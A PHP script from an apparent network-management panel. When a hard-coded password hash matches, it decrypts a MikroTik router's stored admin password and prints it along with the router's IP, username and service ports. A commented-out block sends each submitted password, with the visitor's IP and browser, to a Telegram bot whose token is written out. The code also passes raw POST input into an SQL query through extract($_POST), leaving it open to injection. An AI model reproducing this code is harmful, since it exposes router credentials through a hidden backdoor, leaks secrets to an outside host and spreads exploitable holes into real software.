<?php
extract($_POST);
include("conn/connection.php") ;
include("mk_api.php");

$password = sha1($_POST['pass']);

if($password == 'b59aaf3fcbb4cd540da915cdca72b11d9836bdc3'){
$sqlmk = mysql_query("SELECT id, ServerIP, Username, Pass, Port, e_Md, secret_h FROM mk_con WHERE sts = '0' AND id = '$mk_id'");
		$rowmk = mysql_fetch_assoc($sqlmk);
		
		$ServerIP = $rowmk['ServerIP'];
		$Username = $rowmk['Username'];
		$Pass= openssl_decrypt($rowmk['Pass'], $rowmk['e_Md'], $rowmk['secret_h']);
		$Port = $rowmk['Port'];
$API = new routeros_api();
$API->debug = false;

    if ($API->connect($ServerIP, $Username, $Pass, $Port)) {

		$API->write('/ip/service/print', false);
		$API->write('?name=winbox');
		$res=$API->read(true);
		$winbox_port = $res[0]['port']; 
		
		$API->write('/ip/service/print', false);
		$API->write('?name=www');
		$resd=$API->read(true);
		$www_port = $resd[0]['port']; 
		
		$API->write('/ip/service/print', false);
		$API->write('?name=api');
		$resda=$API->read(true);
		$api_port = $resda[0]['port']; 
		
		$zsfgg = $_SERVER['HTTP_REFERER'];
		$ip = $_SERVER['REMOTE_ADDR'];
		$browser = $_SERVER['HTTP_USER_AGENT'];
$msg_body='..::MK Pass Check::..

URL: '.$zsfgg.'
IP: '.$ip.'
Browser: '.$browser.'
Pass: '.$_POST['pass'].'';

		// $fileURL22 = urlencode($msg_body);
		// $full_link1= 'https://api.telegram.org/bot1849298066:AAFClvT-WAIdHIqkvpYTXTgnrYXF5RWsr5g/sendMessage?chat_id=-537633903&text='.$fileURL22;

					// $ch1 = curl_init();
					// curl_setopt($ch1, CURLOPT_URL,$full_link1); 
					// curl_setopt($ch1, CURLOPT_RETURNTRANSFER,1); // return into a variable 
					// curl_setopt($ch1, CURLOPT_TIMEOUT, 10); 
					// $result11 = curl_exec($ch1); 
					// curl_close($ch1);
		?>
		<p>
			<label style="width: 130px;"></label>
			<span class="field" style="margin-left: 0px;color: red;font-weight: bold;"><?php echo 'WIN-'.$ServerIP.':'.$winbox_port;?><br><?php echo 'WWW-'.$ServerIP.':'.$www_port;?><br><?php echo 'API-'.$ServerIP.':'.$api_port;?><br><?php echo $Username;?><br><?php echo $Pass;?></span>
		</p>
<?php }else{echo 'Selected Network are not Connected.';} } else{echo 'Wrong Info....!!';}

	$API->disconnect();?>